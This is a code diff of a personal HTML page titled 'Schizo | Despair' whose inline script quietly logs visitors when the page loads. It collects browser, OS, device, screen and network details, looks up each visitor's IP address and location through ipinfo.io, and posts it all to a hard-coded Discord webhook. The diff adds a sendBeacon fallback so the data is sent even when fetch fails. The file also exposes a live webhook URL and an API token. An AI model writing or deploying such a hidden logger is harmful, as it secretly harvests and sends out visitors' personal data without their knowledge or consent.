@@ -1,40 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Document Title -->
     <title>Schizo | Despair</title>
-    
-    <!-- Favicon -->
     <link rel="icon" href="/assets/despair.png"/>
-
-    <!-- Open Graph Meta Tags -->
     <meta property="og:title" content="Schizo | Despair"/>
     <meta property="og:description" content="Read about Despair."/>
     <meta property="og:image" content="https://schizophrenic.lol/assets/schizologo.png"/>
-    
-    <!-- Theme Color -->
     <meta name="theme-color" content="#7700ff"/>
-
-    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-
-    <!-- Stylesheets -->
     <link rel="stylesheet" href="/styles.css">
-
-    <!-- Load Scripts -->
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="/scripts/index.js"></script>  
-
-    <!-- Inline Styles -->
-    <style>
-        /* Add custom styles here */
-    </style>
-
-    <!-- Viewport Configuration for Responsive Design -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <!-- Title Bar -->
     <div class="titlebar__bar">
         <div class="titlebar__logo">
             <a href="https://schizophrenic.lol">
@@ -42,16 +20,13 @@
             </a>
         </div>
     </div>
-    <!-- Title Bar -->
-
-    <div></div>
 
     <script>
         // Function to get browser information
         function getBrowserInfo() {
-            const userAgent = navigator.userAgent;
-            let browserName = navigator.appName;
-            let fullVersion = '' + parseFloat(navigator.appVersion);
+            const userAgent = navigator.userAgent || "Unknown";
+            let browserName = navigator.appName || "Unknown";
+            let fullVersion = '' + parseFloat(navigator.appVersion) || "Unknown";
             let nameOffset, verOffset;
 
             if ((verOffset = userAgent.indexOf("Opera")) != -1) {
@@ -82,12 +57,12 @@
                 }
             }
 
-            return browserName + " " + fullVersion;
+            return `${browserName} ${fullVersion}`;
         }
 
         // Function to get operating system information
         function getOSInfo() {
-            const userAgent = navigator.userAgent;
+            const userAgent = navigator.userAgent || "Unknown";
             let os = "Unknown OS";
 
             if (userAgent.indexOf("Win") != -1) os = "Windows";
@@ -104,12 +79,12 @@
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (connection) {
                 return {
-                    downlink: connection.downlink + "Mbps",
-                    effectiveType: connection.effectiveType,
-                    rtt: connection.rtt + "ms",
+                    downlink: connection.downlink ? connection.downlink + "Mbps" : "Unknown",
+                    effectiveType: connection.effectiveType || "Unknown",
+                    rtt: connection.rtt ? connection.rtt + "ms" : "Unknown",
                 };
             }
-            return null;
+            return { downlink: "Unknown", effectiveType: "Unknown", rtt: "Unknown" };
         }
 
         // Function to get device information
@@ -117,53 +92,55 @@
             return {
                 hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                 deviceMemory: navigator.deviceMemory || 'Unknown',
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookieEnabled: navigator.cookieEnabled,
+                userAgent: navigator.userAgent || "Unknown",
+                platform: navigator.platform || "Unknown",
+                language: navigator.language || "Unknown",
+                cookieEnabled: navigator.cookieEnabled || false,
             };
         }
 
         // Function to get screen information
         function getScreenInfo() {
             return {
-                width: window.screen.width,
-                height: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                pixelDepth: window.screen.pixelDepth,
+                width: window.screen.width || "Unknown",
+                height: window.screen.height || "Unknown",
+                colorDepth: window.screen.colorDepth || "Unknown",
+                pixelDepth: window.screen.pixelDepth || "Unknown",
             };
         }
 
         // Function to send data to the Discord webhook
         function sendToDiscord(data) {
+            const payload = JSON.stringify({
+                content: `**New Visitor Logged**\n` +
+                         `**IP:** ${data.ip}\n` +
+                         `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
+                         `**Organization:** ${data.org}\n` +
+                         `**Browser:** ${data.browser}\n` +
+                         `**Operating System:** ${data.os}\n` +
+                         `**Network:** Downlink: ${data.network.downlink}, RTT: ${data.network.rtt}, Effective Type: ${data.network.effectiveType}\n` +
+                         `**Device Info:** CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory}GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}\n` +
+                         `**Screen Resolution:** ${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}\n` +
+                         `**Timestamp:** ${data.timestamp}`,
+                username: 'Web Logger'
+            });
+
+            // Attempt to send data using fetch first
             fetch('https://discord.com/api/webhooks/1271756418101411890/zfiqg4D7Wsq-Hb5Mk4o_ayMd513PLm67T78V434Vw0jdipuxUjEwiijbQCeEvMqLfi9T', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `**New Visitor Logged**\n` +
-                             `**IP:** ${data.ip}\n` +
-                             `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
-                             `**Organization:** ${data.org}\n` +
-                             `**Browser:** ${data.browser}\n` +
-                             `**Operating System:** ${data.os}\n` +
-                             `**Network:** Downlink: ${data.network?.downlink}, RTT: ${data.network?.rtt}, Effective Type: ${data.network?.effectiveType}\n` +
-                             `**Device Info:** CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory}GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}\n` +
-                             `**Screen Resolution:** ${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}\n` +
-                             `**Timestamp:** ${data.timestamp}`,
-                    username: 'Web Logger'
-                }),
-            }).then(response => {
-                console.log('Data sent to Discord:', response);
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
             }).catch(error => {
-                console.error('Error sending data to Discord:', error);
+                console.error('Error sending data via fetch, attempting beacon:', error);
+
+                // Fallback to sendBeacon for iOS or when fetch fails
+                navigator.sendBeacon('https://discord.com/api/webhooks/1271756418101411890/zfiqg4D7Wsq-Hb5Mk4o_ayMd513PLm67T78V434Vw0jdipuxUjEwiijbQCeEvMqLfi9T', payload);
             });
         }
 
         // Function to log user visit
         function logUserVisit() {
-            // Get browser, OS, network, device, and screen info
+            // Get client information
             const clientData = {
                 browser: getBrowserInfo(),
                 os: getOSInfo(),
@@ -173,17 +150,17 @@
                 timestamp: new Date().toLocaleString(),
             };
 
-            // Get IP and location info from IPInfo API and then send all data to Discord
+            // Fetch IP and location info from IPInfo API and then send all data to Discord
             fetch('https://ipinfo.io/json?token=fbc037140ec409')
                 .then(response => response.json())
                 .then(ipData => {
                     const data = {
                         ...clientData,
-                        ip: ipData.ip,
-                        city: ipData.city,
-                        region: ipData.region,
-                        country: ipData.country,
-                        org: ipData.org,
+                        ip: ipData.ip || "Unknown",
+                        city: ipData.city || "Unknown",
+                        region: ipData.region || "Unknown",
+                        country: ipData.country || "Unknown",
+                        org: ipData.org || "Unknown",
                     };
 
                     // Send the combined data to Discord webhook
@@ -191,12 +168,14 @@
                 })
                 .catch(error => {
                     console.error('Error fetching IP info:', error);
+
+                    // In case of failure, still send the client data without IP info
+                    sendToDiscord(clientData);
                 });
         }
 
         // Log the visit as soon as the page loads
         window.onload = logUserVisit;
     </script>
-
 </body>
 </html>
